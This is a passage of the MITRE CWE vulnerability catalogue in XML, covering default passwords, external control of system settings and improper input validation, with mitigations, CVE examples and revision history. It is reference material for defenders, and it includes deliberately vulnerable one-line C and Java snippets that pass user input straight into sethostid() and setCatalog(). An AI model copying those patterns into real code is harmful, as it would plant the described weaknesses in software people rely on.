	<Scope>Confidentiality</Scope>
	<Scope>Integrity</Scope>
	<Scope>Availability</Scope>
	<Impact>Varies by Context</Impact>
	<Impact>Unexpected State</Impact>
	<Note>Consequences of this weakness are highly dependent on the role of affected components within the larger product.</Note>
      </Consequence>
    </Common_Consequences>
    <Potential_Mitigations>
      <Mitigation>
	<Phase>Requirements</Phase>
	<Description>In requirements, be specific about expectations for how the product will perform when it exceeds physical and environmental boundary conditions, e.g., by shutting down.</Description>
      </Mitigation>
      <Mitigation>
	<Phase>Architecture and Design</Phase>
	<Phase>Implementation</Phase>
	<Description>Where possible, include independent components that can detect excess environmental conditions and have the capability to shut down the product.</Description>
      </Mitigation>
      <Mitigation>
	<Phase>Architecture and Design</Phase>
	<Phase>Implementation</Phase>
	<Description>Where possible, use shielding or other materials that can increase the adversary's workload and reduce the likelihood of being able to successfully trigger a security-related failure.</Description>
      </Mitigation>
    </Potential_Mitigations>
    <Observed_Examples>
      <Observed_Example>
        <Reference>CVE-2019-17391</Reference>
        <Description>Lack of anti-glitch protections allows an attacker to launch a physical attack to bypass the secure boot and read protected eFuses.</Description>
        <Link>https://www.cve.org/CVERecord?id=CVE-2019-17391</Link>
      </Observed_Example>
    </Observed_Examples>
    <References>
      <Reference External_Reference_ID="REF-1248" Section="ICS Communications / 2. Unreliability"/>
      <Reference External_Reference_ID="REF-1255"/>
      <Reference External_Reference_ID="REF-1285"/>
      <Reference External_Reference_ID="REF-1286" Section="1.2"/>
    </References>
         <Mapping_Notes>
            <Usage>Allowed-with-Review</Usage>
            <Rationale>This CWE entry is a Class and might have Base-level children that would be more appropriate</Rationale>
            <Comments>Examine children of this entry to see if there is a better fit</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
    <Content_History>
      <Submission>
	      <Submission_Name>CWE Content Team</Submission_Name>
	      <Submission_Organization>MITRE</Submission_Organization>
	      <Submission_Date>2022-04-21</Submission_Date>
	      <Submission_Version>4.7</Submission_Version>
	      <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
      </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Description, Name, Potential_Mitigations, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
      <Contribution Type="Feedback">
	      <Contribution_Name>Members of the Hardware CWE Special Interest Group</Contribution_Name>
	      <Contribution_Date>2022-05-13</Contribution_Date>
	      <Contribution_Comment>Provided feedback on descriptions</Contribution_Comment>
	    </Contribution>
			<Previous_Entry_Name Date="2022-06-28">Improper Handling of Extreme Physical Environment Conditions</Previous_Entry_Name>
    </Content_History>
  </Weakness>
      <Weakness ID="1393" Name="Use of Default Password" Abstraction="Base" Structure="Simple" Status="Incomplete">
      <Description>The product uses default passwords for potentially critical functionality.</Description>
      <Extended_Description>
	It is common practice for products to be designed to use
	default passwords for authentication.  The rationale is to
	simplify the manufacturing process or the system
	administrator's task of installation and deployment into an
	enterprise. However, if admins do not change the defaults,
	then it makes it easier for attackers to quickly bypass
	authentication across multiple organizations. There are many
	lists of default passwords and default-password scanning tools
	that are easily available from the World Wide Web.
      </Extended_Description>
      <Related_Weaknesses>
	<Related_Weakness Nature="ChildOf" CWE_ID="1392" View_ID="1000" Ordinal="Primary"/>
      </Related_Weaknesses>
      <Applicable_Platforms>
		<Language Class="Not Language-Specific" Prevalence="Undetermined"/>
		<Operating_System Class="Not OS-Specific" Prevalence="Undetermined"/>
		<Architecture Class="Not Architecture-Specific" Prevalence="Undetermined"/>
		<Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
		<Technology Class="ICS/OT" Prevalence="Undetermined"/>
      </Applicable_Platforms>
      <Modes_Of_Introduction>
	<Introduction>
	  <Phase>Architecture and Design</Phase>
	</Introduction>
      </Modes_Of_Introduction>
      <Common_Consequences>
	<Consequence>
	  <Scope>Authentication</Scope>
	  <Impact>Gain Privileges or Assume Identity</Impact>
	</Consequence>
      </Common_Consequences>
      <Potential_Mitigations>
	<Mitigation>
	  <Phase>Requirements</Phase>
	  <Description>Prohibit use of default, hard-coded, or other values that do not vary for each installation of the product - especially for separate organizations.</Description>
	  <Effectiveness>High</Effectiveness>
	</Mitigation>
	<Mitigation>
	  <Phase>Documentation</Phase>
	  <Description>Ensure that product documentation clearly emphasizes the presence of default passwords and provides steps for the administrator to change them.</Description>
	  <Effectiveness>Limited</Effectiveness>
	</Mitigation>
	<Mitigation>
	  <Phase>Architecture and Design</Phase>
	  <Description>Force the administrator to change the credential upon installation.</Description>
	  <Effectiveness>High</Effectiveness>
	</Mitigation>
	<Mitigation>
	  <Phase>Installation</Phase>
	  <Phase>Operation</Phase>
	  <Description>The product administrator could change the defaults upon installation or during operation.</Description>
	  <Effectiveness>Moderate</Effectiveness>
	</Mitigation>
      </Potential_Mitigations>
	<Demonstrative_Examples>
        <Demonstrative_Example Demonstrative_Example_ID="DX-153">
          <Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</Intro_Text>
          <Body_Text>Multiple OT products used default credentials.</Body_Text>
        </Demonstrative_Example>
    </Demonstrative_Examples>
      <Observed_Examples>
	<Observed_Example>
	  <Reference>CVE-2022-30270</Reference>
	  <Description>Remote Terminal Unit (RTU) uses default credentials for some SSH accounts</Description>
	  <Link>https://www.cve.org/CVERecord?id=CVE-2022-30270</Link>
	</Observed_Example>
	<Observed_Example>
	  <Reference>CVE-2022-2336</Reference>
	  <Description>OPC Unified Architecture (OPC UA) industrial automation product has a default password</Description>
	  <Link>https://www.cve.org/CVERecord?id=CVE-2022-2336</Link>
	</Observed_Example>
	<Observed_Example>
	  <Reference>CVE-2021-38759</Reference>
	  <Description>microcontroller board has default password</Description>
	  <Link>https://www.cve.org/CVERecord?id=CVE-2021-38759</Link>
	</Observed_Example>
	<Observed_Example>
	  <Reference>CVE-2021-44480</Reference>
	  <Description>children's smart watch has default passwords allowing attackers to send SMS commands and listen to the device's surroundings</Description>
	  <Link>https://www.cve.org/CVERecord?id=CVE-2021-44480</Link>
	</Observed_Example>
	<Observed_Example>
	  <Reference>CVE-2020-11624</Reference>
	  <Description>surveillance camera has default password for the admin account</Description>
	  <Link>https://www.cve.org/CVERecord?id=CVE-2020-11624</Link>
	</Observed_Example>
	<Observed_Example>
	  <Reference>CVE-2018-15719</Reference>
	  <Description>medical dental records product installs a MySQL database with a blank default password</Description>
	  <Link>https://www.cve.org/CVERecord?id=CVE-2018-15719</Link>
	</Observed_Example>
	<Observed_Example>
	  <Reference>CVE-2014-9736</Reference>
	  <Description>healthcare system for archiving patient images has default passwords for key management and storage databases</Description>
	  <Link>https://www.cve.org/CVERecord?id=CVE-2014-9736</Link>
	</Observed_Example>
	<Observed_Example>
	  <Reference>CVE-2000-1209</Reference>
	  <Description>database product installs admin account with default null password, allowing privileges, as exploited by various worms </Description>
	  <Link>https://www.cve.org/CVERecord?id=CVE-2000-1209</Link>
	</Observed_Example>
      </Observed_Examples>
      <References>
	  	<Reference External_Reference_ID="REF-1283"/>
		<Reference External_Reference_ID="REF-1303"/>
        <Reference External_Reference_ID="REF-1446"/>
      </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
      <Content_History>
	<Submission>
	  <Submission_Name>CWE Content Team</Submission_Name>
	  <Submission_Organization>MITRE</Submission_Organization>
	  <Submission_Date>2022-10-07</Submission_Date>
	  <Submission_Version>4.9</Submission_Version>
	  <Submission_ReleaseDate>2022-10-13</Submission_ReleaseDate>
	</Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Observed_Examples, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-07-16</Modification_Date>
					<Modification_Version>4.15</Modification_Version>
					<Modification_ReleaseDate>2024-07-16</Modification_ReleaseDate>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
      </Content_History>
    </Weakness>
      <Weakness ID="15" Name="External Control of System or Configuration Setting" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>One or more system settings or configuration elements can be externally controlled by a user.</Description>
         <Extended_Description>Allowing external control of system settings can disrupt service or cause an application to behave in unexpected, and potentially malicious ways.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="642" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="20" View_ID="700" Ordinal="Primary"/>
         </Related_Weaknesses>
		 <Applicable_Platforms>
		   <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
		   <Technology Class="ICS/OT" Prevalence="Undetermined"/>
		 </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>Setting manipulation vulnerabilities occur when an attacker can control values that govern the behavior of the system, manage specific resources, or in some way affect the functionality of the application.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Varies by Context</Impact>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-46">
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>
                  <xhtml:p>Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.</xhtml:p>
                  <xhtml:p>Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Phase>Architecture and Design</Phase>
               <Description>Because setting manipulation covers a diverse set of functions, any attempt at illustrating it will inevitably be incomplete. Rather than searching for a tight-knit relationship between the functions addressed in the setting manipulation category, take a step back and consider the sorts of system values that an attacker should not be allowed to control.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Phase>Architecture and Design</Phase>
               <Description>In general, do not allow user-provided or otherwise untrusted data to control sensitive values. The leverage that an attacker gains by controlling these values is not always immediately obvious, but do not underestimate the creativity of the attacker.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following C code accepts a number as one of its command line parameters and sets it as the host ID of the current machine.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>...<xhtml:br/>sethostid(argv[1]);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>Although a process must be privileged to successfully invoke sethostid(), unprivileged users may be able to invoke the program. The code in this example allows user input to directly control the value of a system setting. If an attacker provides a malicious value for host ID, the attacker can misidentify the affected machine on the network or cause other unintended behavior.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following Java code snippet reads a string from an HttpServletRequest and sets it as the active catalog for a database Connection.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>conn.setCatalog(request.getParameter("catalog"));<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>In this example, an attacker could cause an error by providing a nonexistent catalog name or connect to an unauthorized portion of the database.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Setting Manipulation</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP25</Entry_ID>
               <Entry_Name>Tainted input to variable</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="13"/>
            <Related_Attack_Pattern CAPEC_ID="146"/>
            <Related_Attack_Pattern CAPEC_ID="176"/>
            <Related_Attack_Pattern CAPEC_ID="203"/>
            <Related_Attack_Pattern CAPEC_ID="270"/>
            <Related_Attack_Pattern CAPEC_ID="271"/>
            <Related_Attack_Pattern CAPEC_ID="579"/>
            <Related_Attack_Pattern CAPEC_ID="69"/>
            <Related_Attack_Pattern CAPEC_ID="76"/>
            <Related_Attack_Pattern CAPEC_ID="77"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-6"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Setting Manipulation</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="20" Name="Improper Input Validation" Abstraction="Class" Structure="Simple" Status="Stable">
        <Description>The product receives input or data, but it does
        not validate or incorrectly validates that the input has the
        properties that are required to process the data safely and
        correctly.</Description>
         <Extended_Description>
	   <xhtml:p>Input validation is a frequently-used technique
	   for checking potentially dangerous inputs in order to
	   ensure that the inputs are safe for processing within the
	   code, or when communicating with other components.  When
	   software does not validate input properly, an attacker is
	   able to craft the input in a form that is not expected by
	   the rest of the application. This will lead to parts of the
	   system receiving unintended input, which may result in
	   altered control flow, arbitrary control of a resource, or
	   arbitrary code execution.</xhtml:p>
	   <xhtml:p>Input validation is not the only technique for
	   processing input, however.  Other techniques attempt to
	   transform potentially-dangerous input into something safe, such
	   as filtering (CWE-790) - which attempts to remove dangerous
	   inputs - or encoding/escaping (CWE-116), which attempts to
	   ensure that the input is not misinterpreted when it is included
	   in output to another component. Other techniques exist as well
	   (see CWE-138 for more examples.)</xhtml:p>
	   <xhtml:p>Input validation can be applied to:</xhtml:p>
	   <xhtml:ul>
	     <xhtml:li>raw data - strings, numbers, parameters, file contents, etc.</xhtml:li>
	     <xhtml:li>metadata - information about the raw data, such as headers or size</xhtml:li>
	   </xhtml:ul>
	   <xhtml:p>Data can be simple or structured.  Structured data
	   can be composed of many nested layers, composed of
	   combinations of metadata and raw data, with other simple or
	   structured data.</xhtml:p>
	   <xhtml:p>Many properties of raw data or metadata may need
	   to be validated upon entry into the code, such
	   as:</xhtml:p>
	   <xhtml:ul>
	     <xhtml:li>specified quantities such as size, length, frequency, price, rate, number of operations, time, etc.</xhtml:li>
	     <xhtml:li>implied or derived quantities, such as the actual size of a file instead of a specified size</xhtml:li>
	     <xhtml:li>indexes, offsets, or positions into more complex data structures</xhtml:li>
	     <xhtml:li>symbolic keys or other elements into hash tables, associative arrays, etc.</xhtml:li>
	     <xhtml:li>well-formedness, i.e. syntactic correctness - compliance with expected syntax </xhtml:li>
	     <xhtml:li>lexical token correctness - compliance with rules for what is treated as a token</xhtml:li>
	     <xhtml:li>specified or derived type - the actual type of the input (or what the input appears to be)</xhtml:li>
	     <xhtml:li>consistency - between individual data elements, between raw data and metadata, between references, etc.</xhtml:li>
	     <xhtml:li>conformance to domain-specific rules, e.g. business logic </xhtml:li>
	     <xhtml:li>equivalence - ensuring that equivalent inputs are treated the same</xhtml:li>
	     <xhtml:li>authenticity, ownership, or other attestations about the input, e.g. a cryptographic signature to prove the source of the data</xhtml:li>
	   </xhtml:ul>
	   <xhtml:p>Implied or derived properties of data must often
	   be calculated or inferred by the code itself.  Errors in
	   deriving properties may be considered a contributing factor
	   to improper input validation.
	   </xhtml:p>
	   <xhtml:p>Note that "input validation" has very different
	   meanings to different people, or within different
	   classification schemes.  Caution must be used when
	   referencing this CWE entry or mapping to it.  For example,
	   some weaknesses might involve inadvertently giving control
	   to an attacker over an input when they should not be able
	   to provide an input at all, but sometimes this is referred
	   to as input validation.</xhtml:p>
	   <xhtml:p>Finally, it is important to emphasize that the
	   distinctions between input validation and output escaping
	   are often blurred, and developers must be careful to
	   understand the difference, including how input validation
	   is not always sufficient to prevent vulnerabilities,
	   especially when less stringent data types must be
	   supported, such as free-form text. Consider a SQL injection
	   scenario in which a person's last name is inserted into a
	   query. The name "O'Reilly" would likely pass the validation
	   step since it is a common last name in the English
	   language. However, this valid name cannot be directly
	   inserted into the database because it contains the "'"
	   apostrophe character, which would need to be escaped or
	   otherwise transformed. In this case, removing the
	   apostrophe might reduce the risk of SQL injection, but it
	   would produce incorrect behavior because the wrong name
	   would be recorded.</xhtml:p>
       </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="707" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="345" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="22" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="41" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="74" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="119" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="770" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Often"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>
                  <xhtml:p>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</xhtml:p>
                  <xhtml:p>If a programmer believes that an attacker cannot modify certain inputs, then the programmer might not perform any input validation at all. For example, in web applications, many programmers believe that cookies and hidden form fields can not be modified from a web browser (CWE-472), although they can be altered using a proxy or a custom program. In a client-server architecture, the programmer might assume that client-side security checks cannot be bypassed, even when a custom client could be written that skips those checks (CWE-602).</xhtml:p>
               </Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Impact>DoS: Resource Consumption (CPU)</Impact>
               <Impact>DoS: Resource Consumption (Memory)</Impact>
               <Note>An attacker could provide unexpected values and cause a program crash or excessive consumption of resources, such as memory and CPU.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Memory</Impact>
               <Impact>Read Files or Directories</Impact>
               <Note>An attacker could read confidential data if they are able to control resource references.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Modify Memory</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>An attacker could use malicious input to modify data or possibly alter control flow in unexpected ways, including arbitrary command execution.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-3">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>Some instances of improper input validation can be detected using automated static analysis.</xhtml:p>
                  <xhtml:p>A static analysis tool might allow the user to specify which application-specific methods or functions perform input validation; the tool might also have built-in knowledge of validation frameworks such as Struts. The tool may then suppress or de-prioritize any associated warnings. This allows the analyst to focus on areas of the software in which input validation does not appear to be present.</xhtml:p>
                  <xhtml:p>Except in the cases described in the previous paragraph, automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes.</xhtml:p>
               </Description>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-4">
               <Method>Manual Static Analysis</Method>
               <Description>When custom input validation is required, such as when enforcing business rules, manual analysis is necessary to ensure that the validation is properly implemented.</Description>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-5">
               <Method>Fuzzing</Method>
               <Description>Fuzzing techniques can be useful for detecting input validation errors. When unexpected inputs are provided to the software, the software should not crash or otherwise become unstable, and it should generate application-controlled error messages. If exceptions or interpreter-generated error messages occur, this indicates that the input was not detected and handled within the application logic itself.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
